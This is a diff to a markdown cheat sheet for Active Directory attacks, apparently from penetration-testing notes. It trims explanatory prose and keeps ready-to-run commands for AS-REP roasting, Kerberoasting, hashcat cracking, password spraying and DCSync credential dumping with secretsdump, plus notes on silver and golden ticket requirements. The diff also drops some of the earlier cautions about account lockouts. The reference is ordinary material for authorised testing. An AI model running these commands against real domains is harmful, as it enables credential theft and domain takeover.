@@ -2,7 +2,7 @@
 
 [← Active Directory quick reference](../05-active-directory.md)
 
-Check the account lockout policy before any password test. A threshold does not guarantee a safe number of attempts: other failures may already have counted against an account.
+Check lockout policy and existing failure count before password tests.
 
 ```bash
 nxc smb <dc-ip> -u <user> -p '<password>' --pass-pol
@@ -10,7 +10,7 @@ nxc smb <dc-ip> -u <user> -p '<password>' --pass-pol
 
 ## AS-REP roasting
 
-An account without Kerberos pre-authentication can return material for offline password testing. Start with a known username or a scoped user list.
+AS-REP: known/scoped users without Kerberos pre-auth:
 
 ```bash
 impacket-GetNPUsers <domain.tld>/ -dc-ip <dc-ip> -usersfile users.txt -no-pass -format hashcat
@@ -20,7 +20,7 @@ hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt
 
 ## Kerberoasting
 
-A domain user can request a service ticket for an SPN. Prefer user-backed service accounts; machine and managed-service account passwords are usually impractical cracking targets.
+Kerberoast: user-backed SPNs; machine/managed-service passwords are usually poor crack targets.
 
 ```bash
 impacket-GetUserSPNs -request -dc-ip <dc-ip> <domain.tld>/<user>
@@ -28,16 +28,20 @@ nxc ldap <dc-ip> -u <user> -p '<password>' --kerberoasting hashes.kerberoast
 hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt
 ```
 
-For a password spray, get the current lockout policy and use a narrow candidate list. `nxc smb <dc-ip> -u users.txt -p '<candidate>' --continue-on-success` checks one candidate across selected users; account lockouts can still result if failures have already accumulated.
+Spray one candidate across a scoped list only after checking lockout state:
+
+```bash
+nxc smb <dc-ip> -u users.txt -p '<candidate>' --continue-on-success
+```
 
 ## Ticket and replication checks
 
-A silver ticket is service-specific; it needs the service-account hash, domain SID, and target SPN. A golden ticket needs the `krbtgt` key and has a different scope. Do not swap the two hashes.
+Silver: service hash + domain SID + target SPN. Golden: `krbtgt` key.
 
-Directory replication of credentials requires the relevant replication rights. Confirm those rights before requesting a selected user's data.
+DCSync requires directory replication rights.
 
 ```bash
 impacket-secretsdump -just-dc <domain.tld>/<user>:<password>@<dc-ip>
 ```
 
-Keep the account, source of each credential, and target service in your notes. NetNTLMv2 challenge-response material is not an NT hash for Pass the Hash.
+Track credential source/account/service. NetNTLMv2 ≠ passable NT hash.
